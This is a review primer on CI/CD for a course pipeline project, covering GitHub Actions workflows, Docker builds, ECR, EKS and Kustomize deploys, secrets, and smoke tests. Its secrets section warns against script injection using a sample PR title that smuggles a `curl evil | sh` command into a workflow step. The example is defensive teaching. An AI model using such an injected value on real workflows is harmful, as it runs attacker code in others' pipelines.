# CI/CD with GitHub Actions, Docker, and Kubernetes: A Primer

A review guide for the concepts behind the Movie Picture Pipeline project. Each
section starts with a concrete example from this repo, then explains the idea,
then lists the gotchas worth remembering.

---

## 0. The whole picture in one diagram

```
 developer                GitHub                               AWS
 ---------                ------                               ---
 git push  ---> PR  ---> [ CI workflow ]
 (branch)               lint || test --> docker build
                        (no secrets, no deploy)
                               |
                         review + merge
                               v
                  push to main ---> [ CD workflow ]
                                  lint || test
                                       |
                                       v
                                   build image ---- docker push ---> [ ECR ]
                                   tag = git SHA                       |
                                       |                               | image pull
                                       v                               v
                                  kubectl apply  ------------------> [ EKS cluster ]
                                  (kustomize)                     Deployment -> Pods
                                       |                          Service (LoadBalancer)
                                       v                               |
                                  smoke test  <---- HTTP --------- [ ELB ] <--- users
                                  pass: done / fail: rollback
```

Keep this flow in mind. Everything below fills in one of its boxes.

---

## 1. CI vs. CD

**Example.** `frontend-ci.yaml` runs on pull requests and never touches AWS.
`frontend-cd.yaml` runs on pushes to `main` and ends with `kubectl apply`.

| Term | Question it answers | Trigger in this project | Output |
| --- | --- | --- | --- |
| Continuous **Integration** | "Is this change safe to merge?" | `pull_request` to `main` | a green or red check on the PR |
| Continuous **Delivery** | "Could we release this right now?" | merge to `main` | a deployable artifact; a human presses the release button |
| Continuous **Deployment** | "Ship it." | merge to `main` | running in production, no human step |

This project is continuous **deployment**: a merge goes straight to EKS.

**Why split CI and CD into separate workflows?**
- *Different triggers.* PRs vs. merges.
- *Different trust.* PRs, especially from forks, must never get cloud credentials. CI needs no secrets, so it gets none.
- *Different blast radius.* A CI failure blocks a merge. A CD failure affects users.

**Shift left.** Find problems as early (and cheaply) as possible. Lint takes
seconds and catches style or obvious bugs. Unit tests take seconds to minutes
and catch logic bugs. A smoke test after deploy catches "it built but doesn't
serve." Run them in order of cost, and fail fast.

---

## 2. GitHub Actions anatomy

**Example (trimmed `backend-ci.yaml`):**

```yaml
name: Backend Continuous Integration       # workflow name (shown in the UI)

on:                                        # EVENTS that trigger it
  pull_request:
    branches: [main]                       #   filter: target branch
    paths: [starter/backend/**]            #   filter: changed files
  workflow_dispatch:                       #   "Run workflow" button

jobs:
  lint:                                    # JOB id
    runs-on: ubuntu-latest                 #   RUNNER (fresh VM per job)
    steps:                                 #   STEPS run sequentially
      - uses: actions/checkout@v7          #     an ACTION (reusable unit)
      - run: pipenv run lint               #     a shell command
  test:
    runs-on: ubuntu-latest
    steps: [...]
  build:
    needs: [lint, test]                    # DEPENDENCY edge
    runs-on: ubuntu-latest
    steps: [...]
```

The hierarchy:

```
 Workflow (.github/workflows/*.yaml)
   |-- triggered by Events (push, pull_request, workflow_dispatch, schedule, ...)
   +-- contains Jobs  --- run in PARALLEL by default, each on its OWN runner VM
         +-- contain Steps --- run SEQUENTIALLY on the same VM, share the filesystem
               +-- each step is `uses:` (an action) or `run:` (a shell script)
```

### Mental model: jobs are separate machines

This idea explains most of Actions' behavior.

- Each job starts from a **clean VM**. Files from `lint` do **not** exist in `build`.
  That's why every job does `checkout` and installs dependencies again, and why
  caching matters (section 4).
- To pass **small values** between jobs, use `outputs`:

  ```yaml
  build:
    outputs:
      image: ${{ steps.image.outputs.image }}     # expose a step output as a job output
    steps:
      - id: image
        run: echo "image=$REGISTRY/backend:$GITHUB_SHA" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build
    steps:
      - run: kustomize edit set image "backend=${{ needs.build.outputs.image }}"
  ```

- To pass **files** between jobs, use `actions/upload-artifact` and
  `actions/download-artifact`. For container images, the registry *is* the
  hand-off: build pushes to ECR and the cluster pulls from it.

### Triggers worth knowing

| Event | Fires when | Notes |
| --- | --- | --- |
| `push` | commits land on a branch | filter with `branches`, `paths`, `tags` |
| `pull_request` | a PR is opened, synchronized (new commits) or reopened | `branches` filters the **target** (base) branch; runs against a merge commit |
| `workflow_dispatch` | someone clicks "Run workflow" or runs `gh workflow run` | can declare typed `inputs` |
| `schedule` | cron | e.g. nightly dependency scans |
| `workflow_call` | another workflow calls this one | makes it a *reusable workflow* |

**Path filters gotcha.** With `paths: [starter/backend/**]`, editing the
workflow file itself would *not* trigger the workflow. That's why this repo
also lists `.github/workflows/backend-ci.yaml` and the composite action path.

---

## 3. Job dependencies: `needs` is the quality gate

**Example:**

```yaml
build:
  needs: [lint, test]
```

```
  lint ---+
          +--> build --> deploy        lint fails  ==>  build: skipped
  test ---+                                             deploy: skipped
                                                        run:    FAILED
```

- Jobs **without** `needs` run in parallel, so `lint` and `test` run at the same time.
- A job with `needs` runs only if *all* the listed jobs **succeeded**. Otherwise it's *skipped*.
- Skipping cascades: `deploy` needs `build`, so it's skipped too.
- **This is the rubric's auto-fail check.** If `build` didn't `need` `test`, a
  failing test could still produce a deployed image.

### Status-check functions

| Expression | Job or step runs when |
| --- | --- |
| *(default)* `success()` | all upstream succeeded |
| `failure()` | something upstream failed |
| `always()` | regardless, even if cancelled |
| `cancelled()` | the run was cancelled |

We use `if: always()` for the `report` and `notify` jobs so the team hears
about failures too. Those jobs **cannot** make a failed run pass. The run's
conclusion is failed if any job failed.

We use `if: failure() && steps.apply.outcome == 'success'` for rollback: only
undo the deploy if *this run* actually applied a change.

---

## 4. Caching: making CI fast

**Before (no cache):** every job downloads about 1,500 npm packages.

```yaml
- uses: actions/setup-node@v7
  with: { node-version: 18 }
- run: npm ci
```

**After (built-in cache):**

```yaml
- uses: actions/setup-node@v7
  with:
    node-version-file: starter/frontend/.nvmrc       # single source of truth for the version
    cache: npm                                       # cache ~/.npm
    cache-dependency-path: starter/frontend/package-lock.json   # cache KEY = hash of lockfile
- run: npm ci
```

How caching works:

```
  key = os + hash(package-lock.json)
          |
   cache hit? --yes--> restore ~/.npm --> npm ci (fast, offline-ish)
          |
          no --> npm ci (slow) --> at job end, save ~/.npm under key
```

- The **cache key** must change when dependencies change. Hashing the lockfile does that.
- `npm ci` vs. `npm install`. `ci` installs *exactly* what the lockfile says,
  deletes `node_modules` first, and fails if `package.json` and the lockfile
  disagree. That makes it reproducible, which is right for CI.
- Python equivalent: `actions/setup-python` with `cache: pipenv`, keyed on
  `Pipfile.lock`. `pipenv install --deploy` is pipenv's `npm ci`: it fails if
  the lockfile is stale.
- **Caches are not artifacts.** A cache is a best-effort speed-up that may be
  evicted. An artifact is a guaranteed output of a run.

---

## 5. Don't repeat yourself: composite actions vs. reusable workflows

**Before:** the same three steps are copied into lint, test and build in both
frontend workflows, six times in all.

**After:** `.github/actions/setup-frontend/action.yml`

```yaml
name: Setup frontend
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v7
      with: { node-version-file: starter/frontend/.nvmrc, cache: npm,
              cache-dependency-path: starter/frontend/package-lock.json }
    - run: npm ci
      shell: bash                 # composite `run` steps MUST declare a shell
      working-directory: starter/frontend
```

```yaml
# in each job
- uses: actions/checkout@v7                 # must run first: the action lives in the repo
- uses: ./.github/actions/setup-frontend
```

| | Composite action | Reusable workflow (`workflow_call`) |
| --- | --- | --- |
| Reuses | a sequence of **steps** | entire **jobs** (with their own runners) |
| Called from | a step: `uses: ./.github/actions/x` | a job: `uses: ./.github/workflows/x.yaml` |
| Secrets | inherits the job's environment | must be passed explicitly (or `secrets: inherit`) |
| Use when | "every job starts with the same setup" | "frontend and backend CD have the same lint, test, build, deploy shape" |

---

## 6. Docker: images, layers, and build-time vs. runtime config

**Example (`starter/frontend/Dockerfile`):**

```dockerfile
FROM node:18.14.2-alpine3.17
ARG REACT_APP_MOVIE_API_URL                         # build-time variable (from --build-arg)
ENV REACT_APP_MOVIE_API_URL=${REACT_APP_MOVIE_API_URL}
WORKDIR /app
COPY package*.json ./                               # layer A: rarely changes
RUN npm ci                                          # layer B: cached unless A changed
COPY . .                                            # layer C: changes every commit
RUN npm run build                                   # layer D: bakes the URL into static JS
CMD ["npm", "run", "serve"]
```

### Layers and the cache

Each instruction creates a layer. If a layer's inputs haven't changed, Docker
reuses it, and **everything after the first changed layer is rebuilt.** So:

```
  COPY package*.json  -> unchanged -> CACHED
  RUN npm ci          -> unchanged -> CACHED   (saves about a minute)
  COPY . .            -> CHANGED   -> rebuild
  RUN npm run build   ->              rebuild
```

**Rule:** copy dependency manifests and install first, then copy source code.

On GitHub's ephemeral runners the local Docker cache disappears after every
job. That's why we use Buildx with the **GitHub Actions cache backend**:

```yaml
- uses: docker/setup-buildx-action@v4
- uses: docker/build-push-action@v7
  with:
    cache-from: type=gha,scope=frontend
    cache-to:   type=gha,scope=frontend,mode=max   # max = cache intermediate layers too
```

### `.dockerignore`

Without it, `COPY . .` sends the runner's `node_modules` into the image.
That's slow and can be wrong: the runner uses Linux glibc, while the image is
Alpine with musl, so native binaries may break. `.dockerignore` works like
`.gitignore` for the build context.

### Build-time vs. runtime configuration

This is the key subtlety of the project.

```
   React (create-react-app)                 Flask
   ------------------------                 -----
   process.env.REACT_APP_X is replaced      os.getenv("X") is read
   by a STRING LITERAL during `npm run      when the PROCESS STARTS
   build`. The output is static JS.
       => configure at BUILD time               => configure at RUN time
          (--build-arg)                            (k8s env / ConfigMap)
```

- The browser downloads static JS. There is no server-side env to read later.
  So the backend URL **must be known when the image is built**, and changing it
  means rebuilding.
- Consequence: frontend CD must resolve the backend URL *before* `docker build`.
  This repo reads it from the live backend Service's load balancer.
- The smoke test greps the built JS bundle for that URL. That's the only way to
  prove the build arg actually landed.
- Trade-off: one image per environment. The usual alternative is runtime
  injection, such as serving a `config.js` generated at container start.

---

## 7. Registries and image tags

**Example:** `123456789012.dkr.ecr.us-east-1.amazonaws.com/backend:5949d91e...` (full git SHA).

```
  <registry host>                         / <repository> : <tag>
  123456789012.dkr.ecr.us-east-1.amazonaws.com / backend   : 5949d91e3f...
```

- **ECR** is AWS's private registry. CI authenticates with
  `aws-actions/amazon-ecr-login`, which runs `docker login` with a short-lived
  token.
- **Why tag with the git SHA, not `latest`?**
  - *Traceability.* `kubectl describe pod` shows the exact commit that's running.
  - *Immutability.* `:latest` points somewhere new after every push, so you can't tell what's deployed.
  - *Rollouts actually happen.* Kubernetes only rolls out when the pod spec
    changes. Re-applying `image: backend:latest` is a no-op even if `latest`
    now points to new bits.
  - *Rollback.* The previous ReplicaSet still references the old SHA.
- Use `${{ github.sha }}` in YAML, or `$GITHUB_SHA` in shell. They're the same value.

---

## 8. Kubernetes essentials

**Example:** `starter/backend/k8s/`

```yaml
# deployment.yaml (desired state: "1 pod running image X")
kind: Deployment
spec:
  replicas: 1
  selector: { matchLabels: { app: backend } }
  template:
    metadata: { labels: { app: backend } }
    spec:
      containers:
        - name: backend
          image: backend              # placeholder, replaced by kustomize
          ports: [{ containerPort: 5000 }]
---
# service.yaml (stable network endpoint)
kind: Service
spec:
  type: LoadBalancer                  # on EKS, this provisions an AWS ELB
  selector: { app: backend }          # routes to pods with this label
  ports: [{ port: 80, targetPort: 5000 }]
```

How the objects relate:

```
  Internet --> ELB :80 --> Service "backend" --(label selector app=backend)--+
                                                                             v
  Deployment "backend" --manages--> ReplicaSet (image=...:sha2) --> Pod :5000
                         (keeps old) ReplicaSet (image=...:sha1)  (scaled to 0)
```

| Object | Role |
| --- | --- |
| **Pod** | one or more containers; ephemeral; gets a new IP when recreated |
| **ReplicaSet** | keeps N identical pods alive |
| **Deployment** | manages ReplicaSets; rolling updates and rollback history |
| **Service** | stable name and IP in front of a changing set of pods, matched by **labels** |
| `type: LoadBalancer` | asks the cloud for an external load balancer (an ELB on AWS) |

**Declarative model.** `kubectl apply` says "make reality look like this
YAML." Running it twice is safe (idempotent). Kubernetes controllers keep
reconciling actual state toward the desired state.

**Rolling update.** When the pod template changes (a new image tag), the
Deployment creates a new ReplicaSet, scales it up, and scales the old one
down. Commands:

```bash
kubectl rollout status deployment/backend --timeout=180s   # block until done (or fail)
kubectl rollout undo   deployment/backend                  # back to the previous ReplicaSet
kubectl rollout history deployment/backend
```

`kubectl apply` returns as soon as the API server **accepts** the change, not
when the pods are healthy. Without `rollout status`, the pipeline would go
green while a crash-looping pod sits in the cluster.

---

## 9. Kustomize: templating without templates

**Example (from the deploy job):**

```bash
cd starter/backend/k8s
kustomize edit set image backend=$ECR/backend:$GITHUB_SHA   # mutates kustomization.yaml (runner only!)
kustomize build | kubectl apply -f -                       # render, then apply
```

After `edit set image`, `kustomization.yaml` gains:

```yaml
images:
  - name: backend                       # matches `image: backend` in deployment.yaml
    newName: 1234.dkr.ecr.../backend
    newTag: 5949d91e...
```

- Kustomize **patches** plain YAML. Helm, by contrast, renders `{{ }}` templates.
- `kustomize build` prints the final manifests. Pipe them to `kubectl apply -f -`
  (`-` means stdin). `kubectl apply -k dir/` is the built-in shortcut.
- **Never commit** the edited `kustomization.yaml`. The SHA belongs to the
  pipeline run, not to source control. In GitOps setups (Argo CD, Flux), a bot
  *does* commit it, but to a separate config repo.
- Overlays (`base/` plus `overlays/staging`, `overlays/prod`) are how kustomize
  handles multiple environments.

---

## 10. Secrets and credentials

**Example:**

```yaml
- uses: aws-actions/configure-aws-credentials@v6
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    aws-region: us-east-1
```

| Mechanism | For | Visible in logs? |
| --- | --- | --- |
| `secrets.X` | credentials, tokens | masked as `***` |
| `vars.X` | non-sensitive config (e.g. `REACT_APP_MOVIE_API_URL` override) | yes |
| `env:` | values for steps (workflow, job or step scope) | yes |

- **Hard-coding credentials is an automatic fail.** Anything committed is
  public forever, even if you delete it later.
- Secrets are **not** passed to workflows triggered by PRs from forks. That's
  another reason CI must not need them.
- **Least privilege.** Set `permissions: contents: read` at the top. Grant
  `pull-requests: write` only to the job that comments.
- **Better than long-lived keys: OIDC.**
  `permissions: id-token: write` plus `role-to-assume:` lets GitHub exchange a
  short-lived token for temporary AWS credentials. No stored keys means nothing
  to leak or rotate. The rubric asks for secrets, but know that OIDC exists.

**Script injection.** Don't interpolate untrusted input straight into `run:`.

```yaml
# BAD: a PR title like `"; curl evil | sh; "` becomes shell code
- run: echo "${{ github.event.pull_request.title }}"
# GOOD: pass it through env, so the shell treats it as data
- run: echo "$TITLE"
  env: { TITLE: "${{ github.event.pull_request.title }}" }
```

---

## 11. EKS authentication: who may run `kubectl`?

**Example:** in Terraform, `aws_eks_access_entry` plus
`aws_eks_access_policy_association` grant `github-action-user` the
`AmazonEKSClusterAdminPolicy` role.

```
 GitHub runner --(AWS keys)--> aws eks update-kubeconfig --> kubeconfig uses
   `aws eks get-token` --> EKS API server: "Is this IAM principal allowed?"
                                  |
                 +----------------+------------------+
                 | Access entries (new, API-based)   |  <- this repo's Terraform
                 | aws-auth ConfigMap (legacy)       |  <- what init.sh edited
                 +-----------------------------------+
```

- Being an IAM admin is **not enough**. EKS has its own authorization layer
  that maps IAM identities to Kubernetes permissions (RBAC).
- `authentication_mode = "API_AND_CONFIG_MAP"` honors both mechanisms.
- `aws eks update-kubeconfig --name cluster --region us-east-1` writes the
  kubeconfig entry that tells `kubectl` where the cluster is and how to get
  a token.

---

## 12. Infrastructure as Code (Terraform), briefly

```bash
terraform init      # download providers, configure backend
terraform plan      # diff: desired (code) vs. actual (state)
terraform apply     # make it so
terraform output    # read values such as ECR URLs and cluster name
terraform destroy   # tear everything down (do it, to stop paying)
```

- **State** (`terraform.tfstate`) maps code to real resource IDs. Never commit
  it, because it can contain secrets. That's why `.gitignore` lists
  `*.tfstate` and `.terraform/`.
- **Teardown order matters.** Services of `type: LoadBalancer` create ELBs that
  Terraform doesn't know about, and they block VPC deletion. Run
  `kubectl delete svc frontend backend` first, then `terraform destroy`.

---

## 13. Verifying a deploy: smoke tests and rollback

**Example (`.github/scripts/smoke-test.sh backend`):**

```bash
host=$(kubectl get svc backend -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
curl --fail "http://$host/movies" | jq -e '.movies | length > 0'
```

| Test type | Scope | Where it runs |
| --- | --- | --- |
| Unit | one function or component, dependencies mocked (`jest.mock('axios')`) | CI |
| Integration | several components together | CI |
| **Smoke** | "is the deployed thing alive and basically correct?" | after deploy |
| End-to-end | real user journeys in a browser | after deploy, or nightly |

- **Retry with a timeout.** New ELB DNS names can take minutes to resolve. One
  `curl` would flake, and an infinite loop would hang the pipeline.
- **Check meaning, not just status.** HTTP 200 from the frontend only proves
  the static server works. Grepping the bundle for the backend URL proves the
  build arg was baked in.
- **Roll back automatically.** On a failed smoke test, run
  `kubectl rollout undo` *and still fail the run*. Users get the old version
  back, and the team still sees red.

---

## 14. Pipeline hygiene

| Practice | YAML | Why |
| --- | --- | --- |
| Cancel superseded CI runs | `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }` | saves minutes; only the latest commit matters |
| Never cancel deploys mid-flight | `cancel-in-progress: false` on CD | a half-applied deploy is worse than a late one |
| Pin tool versions | `.nvmrc`, `python-version: "3.10"`, `actions/x@v7` | CI matches dev and is reproducible (pin to a commit SHA for maximum supply-chain safety) |
| Fail loudly | `set -euo pipefail` in scripts | a failed `curl` in a pipe must not be ignored |
| Report | job summary (`$GITHUB_STEP_SUMMARY`), sticky PR comment, Slack | feedback where people already look |
| Environments | `environment: { name: backend-production, url: ... }` | deployment history, protection rules, approvals |

---

## 15. Monitoring and logging (the course's other half)

The pipeline proves a release *started* healthy. Observability tells you it
*stays* healthy.

- **Logs.** `kubectl logs deploy/backend`, `docker logs mp-backend`. In
  production, ship them to CloudWatch, Loki or ELK.
- **Metrics.** Request rate, errors and duration (RED); CPU and memory. Use
  Prometheus and Grafana or CloudWatch Container Insights.
- **Health probes.** `readinessProbe` (don't send traffic yet) and
  `livenessProbe` (restart me). These make `rollout status` meaningful, because
  a pod only counts as available once it's ready.
- **Alerts** on symptoms users feel (error rate, latency), not just on causes.

---

## 16. Gotchas I hit or that the rubric targets

1. `npm test` without `CI=true` starts **watch mode** and hangs the job forever.
2. `pipenv install` without `--dev` gives you no `flake8`, so `pipenv run lint` fails.
3. The backend's `Pipfile` requires **Python 3.10**. A different Python breaks `pipenv install`.
4. `REACT_APP_*` is **build-time** (section 6). Forgetting `--build-arg` gives `undefined/movies` requests in the browser.
5. Missing `needs:` means build and deploy can run after failed tests, which is an automatic fail.
6. Re-applying the same `:latest` tag triggers **no rollout**. Use the SHA.
7. `kubectl apply` succeeding ≠ app healthy. Use `rollout status` plus a smoke test.
8. Delete LoadBalancer Services before `terraform destroy`, or the VPC deletion hangs.
9. Building on Apple Silicon (arm64) for x86 nodes: use `--platform linux/amd64`, or you get `exec format error` in pods.
10. Path filters exclude the workflow file unless you list it.

---

## 17. Self-check questions

<details><summary>1. Lint and test pass; build fails. Does deploy run? Is the run green?</summary>
No. Deploy `needs: build`, so it's skipped. The run's conclusion is failure.</details>

<details><summary>2. Why can't the frontend read the backend URL from a Kubernetes env var at runtime?</summary>
CRA inlines `process.env.REACT_APP_*` into static JS during `npm run build`. The browser runs that JS, and no server process ever reads the pod's environment.</details>

<details><summary>3. Two jobs both run `npm ci`. Why not install once and share?</summary>
Each job runs on a separate fresh VM. Share the download cache (`cache: npm`) instead of `node_modules`, and use artifacts for real build outputs.</details>

<details><summary>4. What's the difference between `secrets.X` and `vars.X`?</summary>
Secrets are encrypted, masked in logs, and withheld from fork PRs. Vars are plain configuration.</details>

<details><summary>5. You pushed a new image as `:latest` and ran `kubectl apply`. Nothing changed. Why?</summary>
The Deployment spec is byte-identical, so there's no rollout. Tag with a unique SHA, or `kubectl rollout restart` with `imagePullPolicy: Always`, which is the worse option.</details>

<details><summary>6. Why does `report` use `if: always()`, and can it make a failed run pass?</summary>
So results are reported even on failure. No: the run fails if any job fails.</details>

<details><summary>7. What does `kustomize edit set image backend=REPO:TAG` match on?</summary>
The `image: backend` name in the container spec. It writes an `images:` override into `kustomization.yaml`.</details>

<details><summary>8. How does `github-action-user` get permission to run kubectl?</summary>
IAM credentials authenticate it to AWS. An EKS access entry with `AmazonEKSClusterAdminPolicy` (or the legacy aws-auth ConfigMap) authorizes it inside Kubernetes.</details>

<details><summary>9. Why put `COPY package*.json` and `RUN npm ci` before `COPY . .`?</summary>
Layer caching. Source changes then don't invalidate the expensive dependency-install layer.</details>

<details><summary>10. What's the safest way to give Actions AWS access?</summary>
OIDC federation (`id-token: write` plus `role-to-assume`). Credentials are short-lived and nothing is stored.</details>

---

## Key points

- **CI** answers "safe to merge?" on PRs, with no secrets. **CD** answers "ship it" on `main`, with credentials.
- **Jobs = separate VMs** that run in parallel. **Steps = one VM**, sequential. `needs` is the quality gate; `outputs` carry values between jobs.
- **Cache** dependencies keyed on the lockfile. **Composite actions** remove repeated steps.
- **Docker layer order** decides build speed. Buildx with `type=gha` persists the cache across ephemeral runners.
- **React env vars are build-time.** Bake the backend URL in with `--build-arg`, and verify it.
- **Tag images with the git SHA.** That gives traceability, real rollouts and easy rollback.
- **Kubernetes is declarative.** `apply` is accepted asynchronously, so wait for `rollout status`, then smoke-test, and `rollout undo` on failure.
- **Never hard-code credentials.** Use least-privilege `permissions`, and prefer OIDC.
- **Tear down** LoadBalancer Services first, then `terraform destroy`.
